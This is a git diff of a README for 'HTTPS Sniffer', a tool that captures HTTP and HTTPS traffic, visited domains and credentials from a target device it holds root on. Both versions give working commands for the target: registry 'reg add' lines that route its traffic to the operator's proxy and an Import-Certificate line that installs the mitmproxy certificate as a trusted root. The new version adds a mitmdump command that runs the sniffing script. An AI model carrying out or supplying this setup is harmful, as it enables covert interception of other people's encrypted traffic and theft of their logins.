@@ -7,9 +7,9 @@
         style="float: left; margin-right: 10px;">
 </p>
 
-**HTTPS Sniffer** is a tool that captures **HTTP** and **HTTPS** traffic from your target device with a proxy server using **mitmdump** from **mitmproxy** tool. Root privileges into your target device are required.
+**HTTPS Sniffer** is a tool that captures **HTTP** and **HTTPS** traffic from a target device using a proxy server powered by **mitmdump**, part of the **mitmproxy** toolkit. Root privileges on the target device are required.
 
-With this tool you can capture all visited domains and potential credentials.
+With this tool, you can capture all visited domains and potentially exposed credentials.
 
 <p align="center">
     <img width="700"
@@ -21,46 +21,82 @@ With this tool you can capture all visited domains and potential credentials.
 ## Table of contents
 
 - [First stepts](#what-do-i-need-to-run-it)
-    - [Necessary in your device](#for-your-device)
-    - [Necessary in target device](#for-target-device)
+    - [Required on your device](#setup-required-for-your-device)
+    - [Required on target device](#steps-to-configure-target-device)
+- [Usage](#how-does-it-work?)
 
 ## What do I need to run it?
 
-### For your device
+### Setup required for your device
 
-    1. First, clone the repository:
+1. First, clone the repository:
 
-        ```git
-        git clone https://github.com/sammy-ulfh/https_sniffer.git
-        ```
+    ```git
+    git clone https://github.com/sammy-ulfh/https_sniffer.git
+    ```
 
-    2. Then, navigate to the **https_sniffer/script** directory.
+2. Then, navigate to the **https_sniffer/script** directory.
 
-    3. Next, download mitmproxy tool from [mitmproxy.org](https://mitmproxy.org/).
-
-
-### For target device
-
-    1. First, turn on proxy settings:<br/>
-
-        Set **ProxyEnable** configuration to 1. ProxyEnable is stored in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" and you can change their value in terminal using:
-
-        ```CMD
-        reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f
-        ```
-
-    2. Second, set the proxy server setting:<br/>
-
-        Set **ProxyServer** configuration to "192.18.100.100:8080" -> "{YOUR IP}:{YOUR PROXY SERVER PORT}". ProxyServer is stored in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" and you can change their value in terminal using:
-
-        ```CMD
-        reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d "192.168.100.100:8080" /f
-        ```
+3. Next, download mitmproxy tool from [mitmproxy.org](https://mitmproxy.org/).
 
 
-        - **/v** allows you to indicate the name of the configuration that you want to change.
-        - **/t** allows you to indicate the type of data that you will store. The **REG_SZ** syntax is for data strings.
-        - **/d** allows you to indicate the data that you will store.
-        - **/f** allows you to force the action without a confirmation when the file exists.
+### Steps to configure target device
 
-    3. Trust in your proxy server:<br/>
+1. First, run **mitmproxy** on your sniffing device.
+
+2. Second, enable proxy settings:<br/>
+
+    Set **ProxyEnable** registry key to 1.<br/>
+    This key is located at:
+
+    ```
+    "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings"
+    ```
+    
+    You can update its value from the terminal using the following command:
+
+    ```CMD
+    reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f
+    ```
+
+3. Third, set the proxy server adderss:<br/>
+
+    Set the **ProxyServer** registry key to your proxy's IP and PORT, for example:<br/>
+    "192.18.100.100:8080" -> "{YOUR IP}:{YOUR PROXY SERVER PORT}".<br/>
+    This key is also located at:<br/>
+
+    ```
+    "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings"
+    ```
+
+    You can update its value from the terminal using the followind command:
+
+    ```CMD
+    reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d "192.168.100.100:8080" /f
+    ```
+
+    - **/v** specifies the name of the registry value you wan to modify.
+    - **/t** specifies the data type to be stored. For example, **RED_SZ** represents a string value.
+    - **/d** sets the data to be stored in the specified value.
+    - **/f** forces the update without pompting for confirmation if the value already exists.
+
+4. Fourth, trust your proxy's server Certificate:<br/>
+
+    Use the **mitmproxy.cer** located in the  **script/cert** directory and add it to the Trusted Root Certification Authorities store:<br/>
+
+    ```POWERSHELL
+    Import-Certificate -FilePath ".\mitmproxy.cer" -CerStoreLocation Cert:\LocalMachine\Root
+    ```
+
+## How does it work?
+
+This **HTTPS Sniffer** tool allows you to capture all HTTP and HTTPS traffic from a target device, focusing on visited URL's and potential credentials.
+
+Once you have completed all setup stepts, and you can see traffic being captured, it's time to run **mitmdump** on your capturing device usin the **https_sniffer.py** script.
+
+    ```shell
+    ./mitmdump -s https_sniffer.py --quiet
+    ```
+
+    - **-s** lets you specify a custom script for **mitmdump** to process traffic as you define.
+    - **--quiet** supresses all logs, whosing only the output from your script.
